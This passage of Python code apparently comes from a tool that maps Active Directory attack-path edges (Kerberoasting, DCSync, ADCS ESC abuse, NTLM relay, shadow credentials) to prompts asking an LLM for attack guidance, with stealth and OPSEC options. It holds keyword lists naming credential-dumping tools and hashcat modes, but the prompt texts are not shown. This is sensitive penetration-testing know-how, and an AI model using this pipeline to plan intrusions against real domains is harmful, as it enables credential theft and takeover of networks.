        "prompt": CANPSREMOTE_PROMPT,
        "aliases": [],
        "category": "lateral_movement",
        "attack_name": "PowerShell Remoting"
    },

    # Credential Access - LAPS
    "ReadLAPSPassword": {
        "prompt": READLAPS_PROMPT,
        "aliases": [],
        "category": "credential_access",
        "attack_name": "LAPS Password Read"
    },

    # Credential Access - gMSA
    "ReadGMSAPassword": {
        "prompt": READGMSA_PROMPT,
        "aliases": [],
        "category": "credential_access",
        "attack_name": "gMSA Password Read"
    },

    # ACL Abuse - Shadow Credentials
    "AddKeyCredentialLink": {
        "prompt": SHADOWCREDS_PROMPT,
        "aliases": [],
        "category": "acl_abuse",
        "attack_name": "Shadow Credentials"
    },

    # ACL Abuse - WriteSPN
    "WriteSPN": {
        "prompt": KERBEROAST_PROMPT,  # Targeted Kerberoasting
        "aliases": [],
        "category": "acl_abuse",
        "attack_name": "Targeted Kerberoasting"
    },

    # ACL Abuse - Force Password Change
    "ForceChangePassword": {
        "prompt": FORCEPASSWORD_PROMPT,
        "aliases": [],
        "category": "acl_abuse",
        "attack_name": "Password Reset"
    },

    # ACL Abuse - Group Manipulation
    "AddMember": {
        "prompt": ADDMEMBER_PROMPT,
        "aliases": [],
        "category": "acl_abuse",
        "attack_name": "Group Membership Manipulation"
    },
    "AddSelf": {
        "prompt": ADDMEMBER_PROMPT,
        "aliases": [],
        "category": "acl_abuse",
        "attack_name": "Self-Addition to Group"
    },

    # Session Exploitation
    "HasSession": {
        "prompt": HASSESSION_PROMPT,
        "aliases": [],
        "category": "credential_access",
        "attack_name": "Session Credential Harvesting"
    },

    # SID History
    "HasSIDHistory": {
        "prompt": SIDHISTORY_PROMPT,
        "aliases": [],
        "category": "privilege_escalation",
        "attack_name": "SID History Abuse"
    },

    # ADCS Attacks
    "ADCSESC1": {
        "prompt": ADCS_ESC1_PROMPT,
        "aliases": [],
        "category": "adcs",
        "attack_name": "ADCS ESC1"
    },
    "ADCSESC4": {
        "prompt": ADCS_ESC4_PROMPT,
        "aliases": [],
        "category": "adcs",
        "attack_name": "ADCS ESC4"
    },
    "ADCSESC8": {
        "prompt": ADCS_ESC8_PROMPT,
        "aliases": [],
        "category": "adcs",
        "attack_name": "ADCS ESC8"
    },

    # ADCS - Golden Certificate
    "GoldenCert": {
        "prompt": GOLDENCERT_PROMPT,
        "aliases": [],
        "category": "adcs",
        "attack_name": "Golden Certificate"
    },

    # ADCS - Manage CA
    "ManageCA": {
        "prompt": MANAGECA_PROMPT,
        "aliases": [],
        "category": "adcs",
        "attack_name": "CA Administrator Abuse"
    },

    # Lateral Movement - DCOM
    "ExecuteDCOM": {
        "prompt": EXECUTEDCOM_PROMPT,
        "aliases": [],
        "category": "lateral_movement",
        "attack_name": "DCOM Execution"
    },

    # Lateral Movement - SQL
    "SQLAdmin": {
        "prompt": SQLADMIN_PROMPT,
        "aliases": [],
        "category": "lateral_movement",
        "attack_name": "SQL Server Admin"
    },

    # NTLM Relay Attacks
    "CoerceAndRelayNTLMToSMB": {
        "prompt": NTLM_RELAY_PROMPT,
        "aliases": [],
        "category": "relay",
        "attack_name": "NTLM Relay to SMB"
    },
    "CoerceAndRelayNTLMToLDAP": {
        "prompt": NTLM_RELAY_PROMPT,
        "aliases": [],
        "category": "relay",
        "attack_name": "NTLM Relay to LDAP"
    },
    "CoerceAndRelayNTLMToLDAPS": {
        "prompt": NTLM_RELAY_PROMPT,
        "aliases": [],
        "category": "relay",
        "attack_name": "NTLM Relay to LDAPS"
    },
    "CoerceAndRelayNTLMToADCS": {
        "prompt": ADCS_ESC8_PROMPT,  # ESC8 is NTLM relay to ADCS
        "aliases": [],
        "category": "relay",
        "attack_name": "NTLM Relay to ADCS"
    },

    # Coercion to TGT
    "CoerceToTGT": {
        "prompt": COERCETOTGT_PROMPT,
        "aliases": ["AbuseTGTDelegation"],
        "category": "delegation",
        "attack_name": "TGT Capture via Coercion"
    },
    "AbuseTGTDelegation": {
        "prompt": COERCETOTGT_PROMPT,
        "aliases": [],
        "category": "delegation",
        "attack_name": "TGT Delegation Abuse"
    },

    # GPO Abuse
    "WriteGPLink": {
        "prompt": GPLINK_PROMPT,
        "aliases": [],
        "category": "acl_abuse",
        "attack_name": "GPO Link Abuse"
    },
    "GPLink": {
        "prompt": GPLINK_PROMPT,
        "aliases": [],
        "category": "acl_abuse",
        "attack_name": "GPO Abuse"
    },

    # gMSA/sMSA Password
    "DumpSMSAPassword": {
        "prompt": READGMSA_PROMPT,
        "aliases": [],
        "category": "credential_access",
        "attack_name": "sMSA/gMSA Password Dump"
    },

    # RBCD variants
    "WriteAccountRestrictions": {
        "prompt": RBCD_PROMPT,
        "aliases": [],
        "category": "delegation",
        "attack_name": "RBCD via Account Restrictions"
    },
    "AddAllowedToAct": {
        "prompt": RBCD_PROMPT,
        "aliases": [],
        "category": "delegation",
        "attack_name": "RBCD Configuration"
    },

    # SID History Injection
    "SpoofSIDHistory": {
        "prompt": SIDHISTORY_PROMPT,
        "aliases": [],
        "category": "privilege_escalation",
        "attack_name": "SID History Spoofing"
    },

    # Trust Attacks
    "HasTrustKeys": {
        "prompt": DCSYNC_PROMPT,  # Similar to DCSync - use trust keys for cross-domain
        "aliases": [],
        "category": "domain_compromise",
        "attack_name": "Trust Key Abuse"
    },

    # Hybrid Identity
    "SyncedToEntraUser": {
        "prompt": GENERIC_FALLBACK_PROMPT,
        "aliases": [],
        "category": "hybrid",
        "attack_name": "Hybrid Identity Pivot"
    },

    # LAPS Sync
    "SyncLAPSPassword": {
        "prompt": READLAPS_PROMPT,
        "aliases": [],
        "category": "credential_access",
        "attack_name": "LAPS Password Sync"
    },
}

# Map remaining ADCS ESC variants to generic ADCS prompt
for i in [2, 3, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15]:
    edge = f"ADCSESC{i}"
    if edge not in EDGE_SPECIFIC_PROMPTS:
        EDGE_SPECIFIC_PROMPTS[edge] = {
            "prompt": ADCS_GENERIC_PROMPT,
            "aliases": [],
            "category": "adcs",
            "attack_name": f"ADCS ESC{i}"
        }


# =============================================================================
# PROMPT SELECTOR FUNCTION
# =============================================================================
def get_prompt_for_edges(
    edges: List[str],
    context: Dict,
    prefer_stealth: bool = False
) -> tuple[str, str]:
    """
    Select the appropriate prompt based on detected edge types AND context.

    This function now also considers:
    - Query name (e.g., "Kerberoastable Users" → use Kerberoast prompt)
    - Attack indicators (e.g., hasspn=True → Kerberoasting)
    - Available vectors from context

    Args:
        edges: List of edge types in the attack path
        context: Dict with domain, source, target, attack_path, available_vectors, etc.
        prefer_stealth: If True, prefer stealthier attack prompts

    Returns:
        Tuple of (formatted_prompt, attack_name)
    """
    # STEP 1: Check context for attack type hints (query name, available vectors)
    # This handles cases where edge is "MemberOf" but query is about Kerberoastable users
    context_prompt = _check_context_for_attack_type(context)
    if context_prompt:
        prompt, attack_name = context_prompt
        logger.info(f"Selected prompt from context: {attack_name}")
        return _format_prompt(prompt, context), attack_name

    if not edges:
        logger.warning("No edges provided, using fallback prompt")
        return _format_prompt(GENERIC_FALLBACK_PROMPT, context), "Unknown Attack"

    # STEP 2: Sort edges by priority
    sorted_edges = sorted(
        edges,
        key=lambda e: EDGE_PRIORITY.get(e, 0),
        reverse=True
    )

    logger.debug(f"Edge priority order: {sorted_edges}")

    # STEP 3: Find highest priority edge with a specific prompt
    for edge in sorted_edges:
        # Direct match
        if edge in EDGE_SPECIFIC_PROMPTS:
            config = EDGE_SPECIFIC_PROMPTS[edge]
            logger.info(f"Selected prompt for edge '{edge}': {config['attack_name']}")
            return _format_prompt(config["prompt"], context), config["attack_name"]

        # Check ADCS pattern match
        if edge.startswith("ADCS"):
            logger.info(f"Using generic ADCS prompt for edge '{edge}'")
            return _format_prompt(ADCS_GENERIC_PROMPT, context), f"ADCS Attack ({edge})"

    # STEP 4: Check aliases
    for edge in sorted_edges:
        for known_edge, config in EDGE_SPECIFIC_PROMPTS.items():
            if edge in config.get("aliases", []):
                logger.info(f"Selected prompt via alias: '{edge}' -> '{known_edge}'")
                return _format_prompt(config["prompt"], context), config["attack_name"]

    # STEP 5: Fallback
    logger.warning(f"No specific prompt for edges {edges}, using fallback")
    return _format_prompt(GENERIC_FALLBACK_PROMPT, context), "Attack Chain"


def _check_context_for_attack_type(context: Dict) -> Optional[tuple]:
    """
    Check context for attack type hints that override edge-based selection.

    This catches cases where:
    - Query is about Kerberoastable users but edge is just MemberOf
    - Source node has hasspn=True indicating Kerberoasting
    - Available vectors mention specific attack types

    Returns:
        Tuple of (prompt_template, attack_name) or None
    """
    # Check query_name first - when the finding title clearly indicates the attack, use that prompt
    query_name = context.get('query_name', '').lower()
    available_vectors = context.get('available_vectors', '').lower()
    attack_path = context.get('attack_path', '').lower()
    context_combined = f"{query_name} {available_vectors} {attack_path}"

    # Detect if edges indicate a specific attack type — if so, DON'T let Kerberoasting/AS-REP
    # context override the edge-based prompt selection.
    edge_types_str = context.get('edge_types', '').lower()
    acl_abuse_edges = ['writeowner', 'writedacl', 'genericall', 'genericwrite', 'owns',
                       'addkeycredentiallink', 'forcechangepassword', 'addmember', 'addself']
    dcsync_edges = ['getchanges', 'getchangesall', 'getchangesinfilteredset', 'dcsync']
    delegation_edges = ['addallowedtoact', 'allowedtodelegate', 'allowedtoact', 'writeaccountrestrictions']
    has_acl_edges = any(edge in edge_types_str for edge in acl_abuse_edges)
    has_dcsync_edges = any(edge in edge_types_str for edge in dcsync_edges)
    has_delegation_edges = any(edge in edge_types_str for edge in delegation_edges)

    # If edges clearly indicate a specific attack type, skip context override
    # Let the edge-based selector (STEP 2/3) use the correct prompt
    if has_dcsync_edges or has_delegation_edges:
        return None

    # Shadow Credentials - query name e.g. "Shadow Credentials on Domain Controllers"
    # Use Shadow Credentials prompt when the finding title says so and edges include AddKeyCredentialLink
    if 'shadow credential' in context_combined and ('addkeycredentiallink' in edge_types_str or 'add key credential' in edge_types_str):
        logger.info("Context indicates Shadow Credentials attack (query name + edges)")
        return (SHADOWCREDS_PROMPT, "Shadow Credentials")

    # Password Not Required detection — query name explicitly says so
    if 'password not required' in query_name or 'passwd_notreqd' in context_combined:
        logger.info("Context indicates Password Not Required attack (query name)")
        return (PASSWORD_NOT_REQUIRED_PROMPT, "Password Not Required")

    # Dangerous Group Memberships detection — query name explicitly says so
    if 'dangerous group' in query_name:
        logger.info("Context indicates Dangerous Group Membership attack (query name)")
        return (DANGEROUS_GROUP_PROMPT, "Dangerous Group Membership")

    # Kerberoasting detection — SKIP if edges are ACL abuse (hasspn on source is incidental)
    if not has_acl_edges:
        kerberoast_indicators = [
            'kerberoast',
            'hasspn',
            'has spn',
            'service principal',
            'getuserspns',
            '-m 13100',  # hashcat mode
        ]
        if any(indicator in available_vectors or indicator in attack_path for indicator in kerberoast_indicators):
            logger.info("Context indicates Kerberoasting attack")
            return (KERBEROAST_PROMPT, "Kerberoasting")

        # AS-REP Roasting detection — also skip if ACL edges present
        asrep_indicators = [
            'asreproast',
            'as-rep roast',
            'dontreqpreauth',
            'no preauth',
            'getnpusers',
            '-m 18200',  # hashcat mode
        ]
        if any(indicator in available_vectors or indicator in attack_path for indicator in asrep_indicators):
            logger.info("Context indicates AS-REP Roasting attack")
            return (ASREP_ROAST_PROMPT, "AS-REP Roasting")

    # DCSync detection - only if explicitly mentioned
    dcsync_indicators = [
        'dcsync',
        'getchanges',
        'replicating directory',
        'secretsdump',
        'krbtgt',
    ]
    # Be more careful with DCSync - only match if it's clearly the attack type
    dcsync_count = sum(1 for indicator in dcsync_indicators if indicator in available_vectors)
    if dcsync_count >= 2:  # Require multiple indicators
        logger.info("Context indicates DCSync attack")
        return (DCSYNC_PROMPT, "DCSync")

    # WriteOwner/WriteDacl → ADCS chain detection
    # Detect when ACL abuse (WriteOwner, WriteDacl, GenericAll) targets ADCS-related accounts
    edge_types = context.get('edge_types', '').upper()
    target = context.get('target', '').upper()

    acl_edges = ['WRITEOWNER', 'WRITEDACL', 'GENERICALL', 'OWNS']
    has_acl_edge = any(edge in edge_types for edge in acl_edges)
    has_adcs_target = any(indicator in target for indicator in [
        'CA_SVC', 'CA_OPERATOR', 'CA_ADMIN', 'CERTSVC', 'CERT_PUBLISHERS',
        'PKI', 'ADCS', 'CERTIFICATE', 'CA-', '-CA',
    ])

    if has_acl_edge and has_adcs_target:
        logger.info(f"Context indicates WriteOwner/ACL → ADCS chain attack (target: {target})")
        return (WRITEOWNER_ADCS_CHAIN_PROMPT, "WriteOwner → ADCS Exploitation Chain")

    return None


def _format_prompt(prompt_template: str, context: Dict) -> str:
    """
    Format a prompt template with context values and common sections.

    Now also:
    - Prepends ENTITY CONTEXT block (Fix 1: Entity Name Threading)
    - Detects service-specific context (MSSQL, ADCS, Exchange)

    Args:
        prompt_template: The prompt template string
        context: Dict with domain, source, target, source_type, target_type, etc.

    Returns:
        Formatted prompt string with entity context prepended
    """
    # Build common sections (pre-format with context to fill dc_hostname, etc.)
    common_header = COMMON_HEADER.format(**context)
    common_starting = COMMON_STARTING_POSITION.format(**context)
    common_formatting_rules = COMMON_FORMATTING_RULES.format(**context)

    # Build entity context block (Fix 1: Entity Name Threading)
    entity_context = build_entity_context(context)

    # Detect and build service-specific context
    service_context = detect_service_context(context)

    # Format the prompt
    # NOTE: COMMON_OUTPUT_FORMAT, COMMON_OPSEC_RULES, COMMON_EXCLUSIONS are now
    # in the system message (via STATIC_SYSTEM_RULES in rag_service.py).
    # We pass empty strings here so the template placeholders don't error.
    try:
        formatted = prompt_template.format(
            common_header=common_header,
            common_starting_position=common_starting,
            common_output_format="",
            common_formatting_rules=common_formatting_rules,
            common_opsec_rules="",
            common_exclusions="",
            **context
        )

        # PREPEND entity context at the very beginning of the prompt
        # This ensures the LLM sees actual entity names FIRST
        formatted = entity_context + "\n" + formatted

        # Append service context if detected
        if service_context:
            formatted += f"\n\n{service_context}"
            logger.info("Service-specific attack context injected into prompt")

        logger.debug("Entity context block prepended to prompt")
        return formatted
    except KeyError as e:
        logger.error(f"Missing context key in prompt formatting: {e}")
        # Return partially formatted prompt with entity context
        return entity_context + "\n" + prompt_template


def get_attack_category(edges: List[str]) -> str:
    """
    Determine the primary attack category for a set of edges.

    Returns category string: credential_access, acl_abuse, delegation,
                            lateral_movement, domain_compromise, adcs
    """
    if not edges:
        return "unknown"

    # Sort by priority and check categories
    sorted_edges = sorted(
        edges,
        key=lambda e: EDGE_PRIORITY.get(e, 0),
        reverse=True
    )

    for edge in sorted_edges:
        if edge in EDGE_SPECIFIC_PROMPTS:
            return EDGE_SPECIFIC_PROMPTS[edge].get("category", "unknown")
        if edge.startswith("ADCS"):
            return "adcs"

    return "unknown"


# =============================================================================
# STATIC RULES FOR SYSTEM MESSAGE (cacheable by DeepSeek)
# These rules are universal — they don't depend on finding, domain, or entity.
# Moved to system message so DeepSeek caches them across all API calls.
# =============================================================================
STATIC_SYSTEM_RULES = f"""
{COMMON_OUTPUT_FORMAT}

{COMMON_OPSEC_RULES}

{COMMON_EXCLUSIONS}
"""


# =============================================================================
# EXPORTS
# =============================================================================
__all__ = [
    "EDGE_SPECIFIC_PROMPTS",
    "EDGE_PRIORITY",
    "get_prompt_for_edges",
    "get_attack_category",
    # Individual prompts (for testing/debugging)
    "KERBEROAST_PROMPT",
    "ASREP_ROAST_PROMPT",
    "DCSYNC_PROMPT",
    "GENERICALL_PROMPT",
    "GENERICWRITE_PROMPT",
    "WRITEDACL_PROMPT",
    "CONSTRAINED_DELEGATION_PROMPT",
    "RBCD_PROMPT",
    "UNCONSTRAINED_DELEGATION_PROMPT",
    "ADMINTO_PROMPT",
    "CANRDP_PROMPT",
    "CANPSREMOTE_PROMPT",
    "READLAPS_PROMPT",
    "READGMSA_PROMPT",
    "SHADOWCREDS_PROMPT",
    "FORCEPASSWORD_PROMPT",
    "ADDMEMBER_PROMPT",
    "HASSESSION_PROMPT",
    "ADCS_ESC1_PROMPT",
    "ADCS_ESC4_PROMPT",
    "ADCS_ESC8_PROMPT",
    "ADCS_GENERIC_PROMPT",
    "SIDHISTORY_PROMPT",
    "EXECUTEDCOM_PROMPT",
    "SQLADMIN_PROMPT",
    "NTLM_RELAY_PROMPT",
    "GPLINK_PROMPT",
    "GOLDENCERT_PROMPT",
    "COERCETOTGT_PROMPT",
    "MANAGECA_PROMPT",
    "GENERIC_FALLBACK_PROMPT",
    "PASSWORD_NOT_REQUIRED_PROMPT",
    "DANGEROUS_GROUP_PROMPT",
    "STATIC_SYSTEM_RULES",
    "WRITEOWNER_ADCS_CHAIN_PROMPT",
    "CHAIN_DISCOVERY_PROMPT",
]
